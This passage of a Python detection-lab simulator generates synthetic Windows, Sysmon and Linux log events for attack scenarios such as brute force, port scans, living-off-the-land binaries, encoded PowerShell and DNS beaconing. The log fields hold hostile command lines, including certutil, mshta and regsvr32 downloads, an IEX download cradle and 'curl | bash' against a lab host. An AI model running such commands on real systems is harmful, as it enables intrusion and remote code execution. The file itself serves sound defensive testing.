"""Scenario library for `kharibulbul simulate`.

Each scenario is a function ``(ctx) -> list[envelope]`` where ``ctx`` carries
the lab host names / IPs and a timestamp generator.  Envelopes are exactly
what the agent would ship, so the whole server path is exercised.
"""
from __future__ import annotations

import base64
import random
from datetime import datetime, timedelta
from typing import Callable
from xml.sax.saxutils import escape

from ..common.timeutil import UTC, now, to_iso

SECURITY = ("Security", "Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-A5BA-3E3B0328C30D}")
SYSTEM_SCM = ("System", "Service Control Manager", "{555908d1-a6d7-4695-8e1e-26931d2012f4}")
SYSMON = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}")
POWERSHELL = ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}")
RDP = ("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", "Microsoft-Windows-TerminalServices-LocalSessionManager", "{5D896912-022D-40AA-A3A8-4FA5515C76D7}")
CHANNEL_DATASETS = {
    "Security": "windows.security", "System": "windows.system",
    "Microsoft-Windows-Sysmon/Operational": "windows.sysmon",
    "Microsoft-Windows-PowerShell/Operational": "windows.powershell",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational": "windows.rdp",
}


class Ctx:
    def __init__(self, host: str = "ws01", source_ip: str = "10.10.20.55", user: str = "aysel",
                 start: datetime | None = None, spacing: float = 1.0, linux_host: str = "srv-web01",
                 dc: str = "dc01", seed: int | None = None):
        self.host = host
        self.linux_host = linux_host
        self.dc = dc
        self.source_ip = source_ip
        self.user = user
        self.spacing = spacing
        self._t = start or (now() - timedelta(seconds=90))
        self._record = random.randint(100000, 900000)
        self.rnd = random.Random(seed)

    def tick(self, seconds: float | None = None) -> datetime:
        self._t += timedelta(seconds=self.spacing if seconds is None else seconds)
        return self._t

    def record(self) -> int:
        self._record += 1
        return self._record


# --------------------------------------------------------------------------- #
# builders
# --------------------------------------------------------------------------- #

def win_xml(source: tuple, event_id: int, computer: str, data: dict, ts: datetime, record_id: int,
            level: int = 0, task: int = 0, keywords: str = "0x8020000000000000", message: str = "") -> str:
    channel, provider, guid = source
    fields = "".join(f'<Data Name="{escape(str(k))}">{escape(str(v))}</Data>' for k, v in data.items())
    stamp = ts.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
    rendering = f"<RenderingInfo Culture=\"en-US\"><Message>{escape(message)}</Message></RenderingInfo>" if message else ""
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        f'<Provider Name="{provider}" Guid="{guid}"/><EventID>{event_id}</EventID><Version>1</Version><Level>{level}</Level>'
        f'<Task>{task}</Task><Opcode>0</Opcode><Keywords>{keywords}</Keywords><TimeCreated SystemTime="{stamp}"/>'
        f'<EventRecordID>{record_id}</EventRecordID><Correlation/><Execution ProcessID="4" ThreadID="8"/>'
        f'<Channel>{channel}</Channel><Computer>{computer}.lab.local</Computer><Security/></System>'
        f'<EventData>{fields}</EventData>{rendering}</Event>'
    )


def env_win(ctx: Ctx, source: tuple, event_id: int, data: dict, scenario: str, computer: str | None = None,
            ts: datetime | None = None, **kw) -> dict:
    ts = ts or ctx.tick()
    computer = computer or ctx.host
    dataset = CHANNEL_DATASETS.get(source[0], "windows.generic")
    return {"raw": win_xml(source, event_id, computer, data, ts, ctx.record(), **kw), "dataset": dataset,
            "host.name": computer, "host.os.type": "windows", "agent.type": "simulate", "@timestamp": to_iso(ts),
            "fields": {"labels.simulation": scenario}}


def env_syslog(ctx: Ctx, program: str, message: str, scenario: str, host: str | None = None, pid: int | None = None,
               ts: datetime | None = None, dataset: str = "linux.auth") -> dict:
    ts = ts or ctx.tick()
    host = host or ctx.linux_host
    stamp = ts.strftime("%b %e %H:%M:%S").replace("  ", " ") if ts.day >= 10 else ts.strftime("%b  %d %H:%M:%S").replace(" 0", "  ")
    pid_part = f"[{pid or ctx.rnd.randint(1000, 60000)}]"
    return {"raw": f"{stamp} {host} {program}{pid_part}: {message}", "dataset": dataset, "host.name": host,
            "host.os.type": "linux", "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def env_web(ctx: Ctx, ip: str, method: str, path: str, status: int, size: int, ua: str, scenario: str, ts: datetime | None = None) -> dict:
    ts = ts or ctx.tick()
    stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
    return {"raw": line, "dataset": "nginx.access", "host.name": ctx.linux_host, "host.os.type": "linux",
            "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def _logon_common(ctx: Ctx, user: str, logon_type: int, ip: str, workstation: str) -> dict:
    return {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
            "TargetUserSid": "S-1-0-0", "TargetUserName": user, "TargetDomainName": "LAB", "LogonType": str(logon_type),
            "LogonProcessName": "NtLmSsp", "AuthenticationPackageName": "NTLM", "WorkstationName": workstation,
            "ProcessId": "0x0", "ProcessName": "-", "IpAddress": ip, "IpPort": str(ctx.rnd.randint(49152, 65535))}


def sysmon_process(ctx: Ctx, image: str, cmdline: str, parent_image: str, parent_cmd: str, user: str | None = None,
                   integrity: str = "Medium") -> dict:
    pid = ctx.rnd.randint(1000, 30000)
    return {
        "RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{" + ctx.rnd.choice("0123456789abcdef") * 8 + "-0000-0000-0000-000000000001}",
        "ProcessId": str(pid), "Image": image, "FileVersion": "10.0.22621.1", "Description": image.rsplit("\\", 1)[-1],
        "Product": "Microsoft Windows Operating System", "Company": "Microsoft Corporation", "OriginalFileName": image.rsplit("\\", 1)[-1],
        "CommandLine": cmdline, "CurrentDirectory": "C:\\Users\\" + (user or ctx.user) + "\\", "User": "LAB\\" + (user or ctx.user),
        "LogonGuid": "{00000000-0000-0000-0000-000000000000}", "LogonId": "0x3e7", "TerminalSessionId": "1", "IntegrityLevel": integrity,
        "Hashes": "SHA256=" + "".join(ctx.rnd.choice("0123456789abcdef") for _ in range(64)),
        "ParentProcessGuid": "{00000000-0000-0000-0000-000000000002}", "ParentProcessId": str(ctx.rnd.randint(500, 999)),
        "ParentImage": parent_image, "ParentCommandLine": parent_cmd, "ParentUser": "LAB\\" + (user or ctx.user),
    }


def sysmon_network(ctx: Ctx, image: str, src_ip: str, src_port: int, dst_ip: str, dst_port: int, initiated: bool = True,
                   protocol: str = "tcp", user: str | None = None) -> dict:
    return {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{00000000-0000-0000-0000-000000000003}",
            "ProcessId": str(ctx.rnd.randint(4, 3000)), "Image": image, "User": "LAB\\" + (user or ctx.user), "Protocol": protocol,
            "Initiated": "true" if initiated else "false", "SourceIsIpv6": "false", "SourceIp": src_ip, "SourceHostname": "-",
            "SourcePort": str(src_port), "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": dst_ip,
            "DestinationHostname": "-", "DestinationPort": str(dst_port), "DestinationPortName": "-"}


# --------------------------------------------------------------------------- #
# scenarios
# --------------------------------------------------------------------------- #

def windows_brute_force(ctx: Ctx) -> list[dict]:
    """15 failed logons (4625) from one source in ~30s, then one success (4624): brute force + success sequence."""
    out = []
    attacker_ip = ctx.source_ip
    for i in range(15):
        data = _logon_common(ctx, ctx.user if i % 3 else "administrator", 3, attacker_ip, "KALI-LAB")
        data.update({"Status": "0xc000006d", "FailureReason": "%%2313", "SubStatus": "0xc000006a" if i % 4 else "0xc0000064"})
        out.append(env_win(ctx, SECURITY, 4625, data, "windows-brute-force", keywords="0x8010000000000000", task=12544))
    data = _logon_common(ctx, ctx.user, 3, attacker_ip, "KALI-LAB")
    data.update({"TargetLogonId": "0x1a2b3c", "ElevatedToken": "%%1843", "TargetUserSid": "S-1-5-21-1-2-3-1105"})
    out.append(env_win(ctx, SECURITY, 4624, data, "windows-brute-force", task=12544))
    return out


def ssh_brute_force(ctx: Ctx) -> list[dict]:
    """sshd failures for several users from one IP, then an accepted password."""
    out = []
    ip = ctx.source_ip
    users = ["root", "admin", "ubuntu", "oracle", "test", "postgres", "guest", "pi", ctx.user]
    invalid = {"admin", "oracle", "test", "postgres", "guest", "pi"}   # accounts that do not exist on the host
    for i in range(14):
        user = users[i % len(users)]
        port = ctx.rnd.randint(40000, 60000)
        if user in invalid:
            out.append(env_syslog(ctx, "sshd", f"Invalid user {user} from {ip} port {port}", "ssh-brute-force"))
            out.append(env_syslog(ctx, "sshd", f"Failed password for invalid user {user} from {ip} port {port} ssh2", "ssh-brute-force"))
        else:
            out.append(env_syslog(ctx, "sshd", f"Failed password for {user} from {ip} port {port} ssh2", "ssh-brute-force"))
    out.append(env_syslog(ctx, "sshd", f"Accepted password for {ctx.user} from {ip} port 51522 ssh2", "ssh-brute-force"))
    out.append(env_syslog(ctx, "sshd", f"pam_unix(sshd:session): session opened for user {ctx.user}(uid=1001) by (uid=0)", "ssh-brute-force"))
    return out


def port_scan(ctx: Ctx) -> list[dict]:
    """Connection-pattern test: one source touching 40 different ports on a workstation (Sysmon 3) and a Linux host (UFW)."""
    out = []
    ports = [21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445, 464, 465, 514, 587, 593, 636, 993, 995,
             1025, 1433, 1521, 2049, 3268, 3306, 3389, 5432, 5900, 5985, 5986, 8000, 8080, 8443, 9200, 27017, 49152]
    victim_ip = "10.10.20.10"
    for p in ports:
        data = sysmon_network(ctx, "System", ctx.source_ip, ctx.rnd.randint(40000, 65000), victim_ip, p, initiated=False, user="SYSTEM")
        out.append(env_win(ctx, SYSMON, 3, data, "port-scan"))
        ctx.tick(0.2)
    for p in ports[:30]:
        msg = (f"[UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:02:03:00:15:5d:aa:bb:cc:08:00 SRC={ctx.source_ip} DST=10.10.30.20 LEN=44 TOS=0x00 "
               f"PREC=0x00 TTL=52 ID={ctx.rnd.randint(1000, 65000)} PROTO=TCP SPT={ctx.rnd.randint(40000, 65000)} DPT={p} WINDOW=1024 RES=0x00 SYN URGP=0")
        out.append(env_syslog(ctx, "kernel", msg, "port-scan", dataset="linux.firewall", ts=ctx.tick(0.2)))
    return out


LOLBIN_SAMPLES = [
    ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://files.lab.test/kb-test.txt C:\\Users\\Public\\kb-test.txt"),
    ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://files.lab.test/kb-test.hta"),
    ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();"),
    ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s /n /u /i:http://files.lab.test/kb-test.sct scrobj.dll"),
    ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe /transfer kbtest /download /priority high http://files.lab.test/kb-test.txt C:\\Users\\Public\\kb-test.txt"),
    ("C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic.exe process call create \"C:\\Users\\Public\\kb-test.exe\""),
    ("C:\\Windows\\System32\\wscript.exe", "wscript.exe C:\\Users\\Public\\kb-test.vbs"),
    ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all & net user & net localgroup administrators & ipconfig /all"),
]


def lolbin(ctx: Ctx) -> list[dict]:
    """Sysmon 1 process-creation records with living-off-the-land binary command lines (log records only)."""
    out = []
    for image, cmd in LOLBIN_SAMPLES:
        data = sysmon_process(ctx, image, cmd, "C:\\Windows\\System32\\cmd.exe", "cmd.exe")
        out.append(env_win(ctx, SYSMON, 1, data, "lolbin"))
        ctx.tick(2)
    return out


def encoded_powershell(ctx: Ctx) -> list[dict]:
    script = "Write-Output 'Kharibulbul detection test - encoded command'"
    enc = base64.b64encode(script.encode("utf-16le")).decode()
    out = []
    cmd = f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {enc}"
    data = sysmon_process(ctx, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", cmd,
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c start")
    out.append(env_win(ctx, SYSMON, 1, data, "encoded-powershell"))
    sb = {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://files.lab.test/kb-test.ps1')",
          "ScriptBlockId": "aaaaaaaa-1111-2222-3333-bbbbbbbbbbbb", "Path": ""}
    out.append(env_win(ctx, POWERSHELL, 4104, sb, "encoded-powershell", level=3))
    return out


def new_admin_user(ctx: Ctx) -> list[dict]:
    out = []
    subj = {"SubjectUserSid": "S-1-5-21-1-2-3-500", "SubjectUserName": "administrator", "SubjectDomainName": "LAB", "SubjectLogonId": "0x3e7"}
    out.append(env_win(ctx, SECURITY, 4720, {**subj, "TargetUserName": "svc_backup2", "TargetDomainName": ctx.host.upper(),
                                              "TargetSid": "S-1-5-21-1-2-3-1201", "PrivilegeList": "-"}, "new-admin-user", task=13824))
    out.append(env_win(ctx, SECURITY, 4732, {**subj, "MemberName": "-", "MemberSid": "S-1-5-21-1-2-3-1201", "TargetUserName": "Administrators",
                                              "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544"}, "new-admin-user", task=13826))
    out.append(env_win(ctx, SECURITY, 4672, {**subj, "PrivilegeList": "SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege"}, "new-admin-user", task=12548))
    return out


def log_cleared(ctx: Ctx) -> list[dict]:
    data = {"SubjectUserSid": "S-1-5-21-1-2-3-1105", "SubjectUserName": ctx.user, "SubjectDomainName": "LAB", "SubjectLogonId": "0x1a2b3c"}
    return [env_win(ctx, SECURITY, 1102, data, "log-cleared", keywords="0x4020000000000000", task=104)]


def suspicious_service(ctx: Ctx) -> list[dict]:
    out = []
    out.append(env_win(ctx, SYSTEM_SCM, 7045, {"ServiceName": "KBUpdaterSvc", "ImagePath": "C:\\Windows\\Temp\\kb-updater.exe -k",
                                                "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"},
                       "suspicious-service", keywords="0x8080000000000000"))
    out.append(env_win(ctx, SECURITY, 4697, {"SubjectUserSid": "S-1-5-18", "SubjectUserName": ctx.host.upper() + "$", "SubjectDomainName": "LAB",
                                             "SubjectLogonId": "0x3e7", "ServiceName": "KBUpdaterSvc", "ServiceFileName": "C:\\Windows\\Temp\\kb-updater.exe -k",
                                             "ServiceType": "0x10", "ServiceStartType": "2", "ServiceAccount": "LocalSystem"}, "suspicious-service", task=12808))
    return out


def scheduled_task(ctx: Ctx) -> list[dict]:
    content = ("<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\"><Actions><Exec><Command>powershell.exe</Command>"
               "<Arguments>-w hidden -c \"Start-Process C:\\Users\\Public\\kb-test.exe\"</Arguments></Exec></Actions></Task>")
    data = {"SubjectUserSid": "S-1-5-21-1-2-3-1105", "SubjectUserName": ctx.user, "SubjectDomainName": "LAB", "SubjectLogonId": "0x1a2b3c",
            "TaskName": "\\Microsoft\\Windows\\KBTest\\Updater", "TaskContent": content}
    return [env_win(ctx, SECURITY, 4698, data, "scheduled-task", task=12804)]


def suspicious_dns(ctx: Ctx) -> list[dict]:
    out = []
    for name in ("kb-c2-test.badlab.xyz", "update.lab.local", "pastebin-mirror.lab.test", "kb-beacon.evil-lab.top"):
        data = {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{00000000-0000-0000-0000-000000000004}",
                "ProcessId": "4242", "QueryName": name, "QueryStatus": "0", "QueryResults": "::ffff:203.0.113.77;",
                "Image": "C:\\Users\\Public\\kb-test.exe", "User": "LAB\\" + ctx.user}
        out.append(env_win(ctx, SYSMON, 22, data, "suspicious-dns"))
    return out


def linux_privilege(ctx: Ctx) -> list[dict]:
    out = []
    for _ in range(3):  # each wrong password is logged by PAM, then sudo writes the summary line
        out.append(env_syslog(ctx, "sudo", f"pam_unix(sudo:auth): authentication failure; logname={ctx.user} uid=1001 euid=0 tty=/dev/pts/0 ruser={ctx.user} rhost=  user={ctx.user}", "linux-privilege"))
    out.append(env_syslog(ctx, "sudo", f"{ctx.user} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{ctx.user} ; USER=root ; COMMAND=/bin/bash", "linux-privilege"))
    out.append(env_syslog(ctx, "sudo", f"{ctx.user} : TTY=pts/0 ; PWD=/home/{ctx.user} ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash kbtest", "linux-privilege"))
    out.append(env_syslog(ctx, "useradd", "new user: name=kbtest, UID=1002, GID=1002, home=/home/kbtest, shell=/bin/bash", "linux-privilege"))
    out.append(env_syslog(ctx, "sudo", f"{ctx.user} : TTY=pts/0 ; PWD=/home/{ctx.user} ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo kbtest", "linux-privilege"))
    out.append(env_syslog(ctx, "usermod", "add 'kbtest' to group 'sudo'", "linux-privilege"))
    out.append(env_syslog(ctx, "usermod", "add 'kbtest' to shadow group 'sudo'", "linux-privilege"))
    out.append(env_syslog(ctx, "su", f"(to root) {ctx.user} on pts/0", "linux-privilege"))
    out.append(env_syslog(ctx, "sudo", f"{ctx.user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://files.lab.test/kb-test.sh | bash'", "linux-privilege"))
    return out


def web_scan(ctx: Ctx) -> list[dict]:
    out = []
    paths = ["/admin/", "/wp-login.php", "/.env", "/phpmyadmin/", "/backup.zip", "/.git/config", "/console", "/api/v1/users",
             "/etc/passwd", "/cgi-bin/test.cgi", "/shell.php", "/config.php.bak", "/login?user=admin'--", "/xmlrpc.php",
             "/server-status", "/actuator/health", "/.aws/credentials", "/robots.txt", "/sitemap.xml", "/uploads/"]
    for i, p in enumerate(paths):
        status = 404 if i % 5 else 403
        out.append(env_web(ctx, ctx.source_ip, "GET", p, status, ctx.rnd.randint(150, 900), "Mozilla/5.0 (compatible; Nikto/2.1.6)", "web-scan"))
        ctx.tick(0.3)
    for i in range(6):
        out.append(env_web(ctx, ctx.source_ip, "POST", "/wp-login.php", 200 if i == 5 else 401, 1200, "python-requests/2.31", "web-scan"))
    return out


def intel_hit(ctx: Ctx) -> list[dict]:
    """Outbound connection and DNS query to indicators listed in intel/ (see intel/ips.txt, intel/domains.txt)."""
    out = []
    data = sysmon_network(ctx, "C:\\Users\\Public\\kb-test.exe", "10.10.20.10", 50511, "203.0.113.66", 4444, initiated=True)
    out.append(env_win(ctx, SYSMON, 3, data, "intel-hit"))
    q = {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{00000000-0000-0000-0000-000000000005}",
         "ProcessId": "4243", "QueryName": "kb-c2-test.badlab.xyz", "QueryStatus": "0", "QueryResults": "::ffff:203.0.113.66;",
         "Image": "C:\\Users\\Public\\kb-test.exe", "User": "LAB\\" + ctx.user}
    out.append(env_win(ctx, SYSMON, 22, q, "intel-hit"))
    return out


def office_spawn(ctx: Ctx) -> list[dict]:
    data = sysmon_process(ctx, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -w hidden -c \"Write-Output kb-test\"",
                          "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                          "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\aysel\\Downloads\\invoice.docm\"")
    return [env_win(ctx, SYSMON, 1, data, "office-spawn")]


def credential_access(ctx: Ctx) -> list[dict]:
    """Sysmon 10: a non-standard process opening lsass with suspicious access mask (log record only)."""
    data = {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "SourceProcessGUID": "{00000000-0000-0000-0000-000000000006}",
            "SourceProcessId": "5120", "SourceThreadId": "5130", "SourceImage": "C:\\Users\\Public\\kb-test.exe",
            "TargetProcessGUID": "{00000000-0000-0000-0000-000000000007}", "TargetProcessId": "712", "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d2e4|UNKNOWN(0000000000000000)", "SourceUser": "LAB\\" + ctx.user, "TargetUser": "NT AUTHORITY\\SYSTEM"}
    return [env_win(ctx, SYSMON, 10, data, "credential-access")]


def baseline(ctx: Ctx) -> list[dict]:
    """Benign background noise so dashboards and false-positive checks have normal data."""
    out = []
    for i in range(12):
        data = _logon_common(ctx, ctx.rnd.choice([ctx.user, "rauf", "leyla", "svc_backup"]), ctx.rnd.choice([2, 3, 10]), "10.10.20." + str(ctx.rnd.randint(20, 60)), ctx.host.upper())
        data.update({"TargetLogonId": hex(ctx.rnd.randint(1, 1 << 24)), "ElevatedToken": "%%1843"})
        out.append(env_win(ctx, SECURITY, 4624, data, "baseline", task=12544))
        proc = ctx.rnd.choice([("C:\\Windows\\explorer.exe", "explorer.exe"), ("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "firefox.exe -contentproc"),
                               ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p"), ("C:\\Windows\\System32\\notepad.exe", "notepad.exe notes.txt")])
        out.append(env_win(ctx, SYSMON, 1, sysmon_process(ctx, proc[0], proc[1], "C:\\Windows\\explorer.exe", "explorer.exe"), "baseline"))
        q = {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{00000000-0000-0000-0000-000000000008}",
             "ProcessId": "3001", "QueryName": ctx.rnd.choice(["www.microsoft.com", "update.lab.local", "www.gov.az", "az.wikipedia.org"]),
             "QueryStatus": "0", "QueryResults": "::ffff:23.45.67.89;", "Image": proc[0], "User": "LAB\\" + ctx.user}
        out.append(env_win(ctx, SYSMON, 22, q, "baseline"))
        out.append(env_syslog(ctx, "sshd", f"Accepted publickey for ops from 10.10.20.{ctx.rnd.randint(20, 60)} port {ctx.rnd.randint(40000, 60000)} ssh2: ED25519 SHA256:abc", "baseline"))
        out.append(env_syslog(ctx, "CRON", "(root) CMD (/usr/lib/sysstat/sa1 1 1)", "baseline", dataset="linux.cron"))
        out.append(env_web(ctx, "10.10.20." + str(ctx.rnd.randint(20, 60)), "GET", ctx.rnd.choice(["/", "/index.html", "/about", "/static/app.css"]), 200, ctx.rnd.randint(500, 5000), "Mozilla/5.0 (Windows NT 10.0) Firefox/128.0", "baseline"))
    return out


# --------------------------------------------------------------------------- #
# Week 3 scenarios - exercise the rules written by the team (rules/team/*.yml)
# --------------------------------------------------------------------------- #

def env_auditd(ctx: Ctx, rtype: str, body: str, scenario: str, ts: datetime | None = None) -> dict:
    ts = ts or ctx.tick()
    ctx._serial = getattr(ctx, "_serial", 9000) + 1
    raw = f"type={rtype} msg=audit({ts.timestamp():.3f}:{ctx._serial}): {body}"
    return {"raw": raw, "dataset": "linux.auditd", "host.name": ctx.linux_host, "host.os.type": "linux",
            "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def env_nginx_error(ctx: Ctx, level: str, message: str, scenario: str, ts: datetime | None = None) -> dict:
    ts = ts or ctx.tick()
    raw = f"{ts:%Y/%m/%d %H:%M:%S} [{level}] 1201#1201: *{ctx.rnd.randint(10, 999)} {message}"
    return {"raw": raw, "dataset": "nginx.error", "host.name": ctx.linux_host, "host.os.type": "linux",
            "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def env_dhcp(ctx: Ctx, code: str, description: str, ip: str, hostname: str, mac: str, scenario: str, ts: datetime | None = None) -> dict:
    ts = ts or ctx.tick()
    raw = f"{code},{ts:%m/%d/%y},{ts:%H:%M:%S},{description},{ip},{hostname},{mac},,{ctx.rnd.randint(1, 1 << 31)},0,,,,,,,,,0"
    return {"raw": raw, "dataset": "windows.dhcp", "host.name": ctx.dc, "host.os.type": "windows",
            "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def after_hours_logon(ctx: Ctx) -> list[dict]:
    """4624 remote-interactive on the DC stamped at 22:30 UTC = 02:30 lab time -> KB-WIN-007."""
    ts = (now() - timedelta(days=1)).replace(hour=22, minute=30, second=0, microsecond=0)
    data = _logon_common(ctx, "administrator", 10, "10.10.20.55", "WS-UNKNOWN")
    data.update({"TargetLogonId": "0x5f5e1", "ElevatedToken": "%%1842", "TargetUserSid": "S-1-5-21-1-2-3-500"})
    return [env_win(ctx, SECURITY, 4624, data, "after-hours-logon", computer=ctx.dc, ts=ts, task=12544)]


def multi_host_logon(ctx: Ctx) -> list[dict]:
    """Network logons of one account on 5 hosts within a minute -> KB-WIN-008."""
    out = []
    for host in ("ws01", "ws02", "srv-web01", "dc01", "srv-file01"):
        data = _logon_common(ctx, ctx.user, 3, "10.10.20.10", "WS01")
        data.update({"TargetLogonId": hex(ctx.rnd.randint(1, 1 << 24)), "ElevatedToken": "%%1843"})
        out.append(env_win(ctx, SECURITY, 4624, data, "multi-host-logon", computer=host, task=12544))
        ctx.tick(5)
    return out


def rdp_then_service(ctx: Ctx) -> list[dict]:
    """RDP session logon (LocalSessionManager 21) then a new service (7045) on the same host -> KB-COR-006."""
    out = [env_win(ctx, RDP, 21, {"User": f"LAB\\{ctx.user}", "SessionID": "3", "Address": ctx.source_ip}, "rdp-then-service", level=4)]
    ctx.tick(20)
    out.append(env_win(ctx, SYSTEM_SCM, 7045, {"ServiceName": "KBRemoteSvc", "ImagePath": "C:\\Windows\\Temp\\kb-remote.exe",
                                                "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"},
                       "rdp-then-service", keywords="0x8080000000000000"))
    return out


def download_then_execute(ctx: Ctx) -> list[dict]:
    """Sysmon 11 executable written to Downloads, then Sysmon 1 running it -> KB-COR-007 (+KB-SYS-050)."""
    path = f"C:\\Users\\{ctx.user}\\Downloads\\kb-invoice.exe"
    stamp = ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    fc = {"RuleName": "-", "UtcTime": stamp, "ProcessGuid": "{00000000-0000-0000-0000-000000000011}", "ProcessId": "4100",
          "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "TargetFilename": path, "CreationUtcTime": stamp, "User": f"LAB\\{ctx.user}"}
    out = [env_win(ctx, SYSMON, 11, fc, "download-then-execute")]
    ctx.tick(15)
    out.append(env_win(ctx, SYSMON, 1, sysmon_process(ctx, path, f'"{path}"', "C:\\Windows\\explorer.exe", "explorer.exe"), "download-then-execute"))
    return out


def dns_beacon(ctx: Ctx) -> list[dict]:
    """70 DNS queries from one process to changing sub-domains of one registered domain -> KB-NET-014."""
    out = []
    for i in range(70):
        ts = ctx.tick(2)
        q = {"RuleName": "-", "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "ProcessGuid": "{00000000-0000-0000-0000-000000000012}",
             "ProcessId": "4242", "QueryName": f"s{i:03d}.kbcdn-test.net", "QueryStatus": "0", "QueryResults": "::ffff:192.0.2.23;",
             "Image": "C:\\Users\\Public\\kb-test.exe", "User": f"LAB\\{ctx.user}"}
        out.append(env_win(ctx, SYSMON, 22, q, "dns-beacon", ts=ts))
    return out


def defender_exclusion(ctx: Ctx) -> list[dict]:
    """Sysmon 13: registry value set under Windows Defender\\Exclusions -> KB-SYS-072."""
    data = {"RuleName": "-", "UtcTime": ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "EventType": "SetValue",
            "ProcessGuid": "{00000000-0000-0000-0000-000000000013}", "ProcessId": "5200",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public",
            "Details": "DWORD (0x00000000)", "User": f"LAB\\{ctx.user}"}
    return [env_win(ctx, SYSMON, 13, data, "defender-exclusion")]


def web_errors(ctx: Ctx) -> list[dict]:
    """25 HTTP 5xx responses in a minute + nginx error-log probes for sensitive files -> KB-WEB-006, KB-WEB-007."""
    out = []
    for i in range(25):
        out.append(env_web(ctx, f"10.10.20.{20 + i % 30}", "GET", "/api/orders", 502 if i % 3 else 500, 150,
                           "Mozilla/5.0 (Windows NT 10.0) Firefox/128.0", "web-errors", ts=ctx.tick(2)))
    for path in ("/.env", "/.git/config", "/wp-config.php.bak", "/.aws/credentials"):
        msg = (f'open() "/var/www/html{path}" failed (2: No such file or directory), client: {ctx.source_ip}, server: srv-web01, '
               f'request: "GET {path} HTTP/1.1", host: "srv-web01"')
        out.append(env_nginx_error(ctx, "error", msg, "web-errors"))
    return out


def fail2ban_ban(ctx: Ctx) -> list[dict]:
    """fail2ban Found x5 then Ban for one lab source (syslog) -> KB-NET-030, KB-NET-033."""
    out = []
    for _ in range(5):
        ts = ctx.tick()
        out.append(env_syslog(ctx, "fail2ban.filter", f"INFO [sshd] Found {ctx.source_ip} - {ts:%Y-%m-%d %H:%M:%S}", "fail2ban", pid=900, ts=ts))
    out.append(env_syslog(ctx, "fail2ban.actions", f"NOTICE [sshd] Ban {ctx.source_ip}", "fail2ban", pid=900))
    return out


def auditd_records(ctx: Ctx) -> list[dict]:
